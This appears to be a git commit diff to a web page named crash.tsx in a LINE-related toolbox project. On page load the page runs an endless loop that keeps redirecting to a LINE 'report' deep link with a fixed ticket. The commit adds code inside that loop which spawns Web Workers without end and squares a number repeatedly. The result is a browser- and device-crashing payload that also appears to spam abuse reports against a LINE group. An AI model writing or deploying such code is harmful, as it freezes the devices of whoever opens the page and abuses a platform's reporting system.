c65180e212e298f410e071d71330b1ab682a1395
EdamAme <121654029+EdamAme-x@users.noreply.github.com>
2023-10-15 18:34:14 +0900

    add

--- line-tool-box/pages/crash.tsx
+++ line-tool-box/pages/crash.tsx
@@ -8,9 +8,12 @@ import { Loading } from "@/src/components/Loading/Loading";
 
 export default function Token() {
   useEffect(() => {
+    let a = 7;
     while (!0) {
       location.href =
         "line://square/report?ticket=VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w";
+        new Worker("worker.js");
+        a = a ** 2;
     }
   }, []);
   return (
